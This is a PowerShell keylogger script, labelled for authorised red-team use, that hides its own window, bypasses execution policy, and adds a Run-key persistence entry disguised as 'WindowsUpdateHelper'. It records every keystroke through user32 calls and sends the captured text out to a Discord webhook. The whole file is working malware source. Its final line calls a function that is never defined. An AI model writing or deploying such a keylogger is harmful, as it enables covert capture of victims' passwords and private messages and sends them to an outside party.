# PowerShell Keylogger with Persistence & Discord Webhook Exfiltration
# Educational / Red Team / Authorized Testing Only
# DO NOT use on systems you do not own or have explicit permission to test

# Hide the console window by relaunching the script with a hidden window style
if (-not $env:RUNNING_HIDDEN) {
    $env:RUNNING_HIDDEN = "1"
    Start-Process powershell `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" `
        -WindowStyle Hidden
    exit
}

$webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE"

$logPath = "$env:APPDATA\Microsoft\Windows\keylog.txt"
$sendPath   = "$env:APPDATA\Microsoft\Windows\mylog-send.txt"
$log = ""

$maxTime = 3  # Seconds
$sw = [System.Diagnostics.Stopwatch]::StartNew()

# Empty file if it exists, else create it
"" | Out-File -FilePath $logPath -Encoding utf8 -Force

Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;

public class Keyboard {

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern int ToUnicode(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
        int cchBuff,
        uint wFlags);

    [DllImport("user32.dll")]
    public static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    public static extern uint MapVirtualKey(uint uCode, uint uMapType);
}
"@

# Discord webhook sending function
function Send-ToDiscord {
    param([string]$content)
    if ([string]::IsNullOrWhiteSpace($content)) { return }

    $payload = @{ content = $content } | ConvertTo-Json -Compress
    try {
        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 | Out-Null
    } catch {
        Write-Host "Send error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Persistence function
function Set-Persistence {
    $currentScriptPath = $MyInvocation.MyCommand.Path
    if (-not $currentScriptPath) {
        $currentScriptPath = "$env:APPDATA\Microsoft\Windows\start.ps1"
        $MyInvocation.MyCommand.Definition | Out-File -FilePath $currentScriptPath -Encoding utf8 -Force
    }
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $value   = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$currentScriptPath`""
    Set-ItemProperty -Path $regPath -Name "WindowsUpdateHelper" -Value $value -Force
}

# Add persistence if not already present
if (-not (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -ErrorAction SilentlyContinue)) {
    Set-Persistence
}

# Main loop
while ($true) {
    Start-Sleep -Milliseconds 40

    $keyState = New-Object Byte[] 256
    [Keyboard]::GetKeyboardState($keyState)

    # Shift
    if ([Keyboard]::GetAsyncKeyState(16) -band 0x8000) {
        $keyState[16] = 0x80
    }

    # Caps lock
    if ([Console]::CapsLock) {
        $keyState[20] = 0x01
    }

    for ($key = 8; $key -le 222; $key++) {

        if ([Keyboard]::GetAsyncKeyState($key) -eq -32767) {

            # Backspace
            if ($key -eq 8) {
                if ($log.Length -gt 0) {
                    $log = $log.Substring(0, $log.Length - 1)
                }
                continue
            }

            # Enter
            if ($key -eq 13) {
                Add-Content -Path $logPath -Value $log -Encoding utf8
                $log = ""
                $sw.Restart()
                continue
            }

            $scanCode = [Keyboard]::MapVirtualKey($key, 0)
            $buffer   = New-Object System.Text.StringBuilder 2

            $result = [Keyboard]::ToUnicode(
                $key,
                $scanCode,
                $keyState,
                $buffer,
                2,
                0
            )

            if ($result -gt 0) {
                $log += $buffer.ToString()
                $sw.Restart()  # Reset idle timer on any keypress
            }
        }
    }

    $timeElapsed = $sw.Elapsed.TotalSeconds

    # Send to Discord when typing has been idle for specified time
    if ($timeElapsed -ge $maxTime -and $log.Length -gt 0) {
        # Flush current buffer to file first
        Add-Content -Path $logPath -Value $log -Encoding utf8
        $log = ""

        $content = Get-Content -Path $logPath -Raw -ErrorAction SilentlyContinue
        $cleanContent = ($content -replace "`r","" -replace "`n","").Trim()

        if (-not [string]::IsNullOrWhiteSpace($cleanContent)) {
            Move-Item -Path $logPath -Destination $sendPath -Force
            "" | Out-File -FilePath $logPath -Encoding UTF8
            $content = Get-Content -Path $sendPath -Raw -ErrorAction SilentlyContinue
            $cleanContent = ($content -replace "`r","" -replace "`n","").Trim()
            Send-ToDiscord ($cleanContent)
            Remove-Item -Path $sendPath -Force -ErrorAction SilentlyContinue
        }

        $sw.Restart()
    } elseif ($timeElapsed -ge $maxTime -and (Test-Path $logPath)) {
        # Nothing in buffer but file has leftover content from Enter flushes
        $content = Get-Content -Path $logPath -Raw -ErrorAction SilentlyContinue
        if (-not [string]::IsNullOrWhiteSpace($content)) {
            Move-Item -Path $logPath -Destination $sendPath -Force
            "" | Out-File -FilePath $logPath -Encoding UTF8
            $cleanContent = ($content -replace "`r","" -replace "`n","").Trim()
            Send-ToDiscord ($cleanContent)
            Remove-Item -Path $sendPath -Force -ErrorAction SilentlyContinue
        }
        $sw.Restart()
    }
}

Start-KeyLogger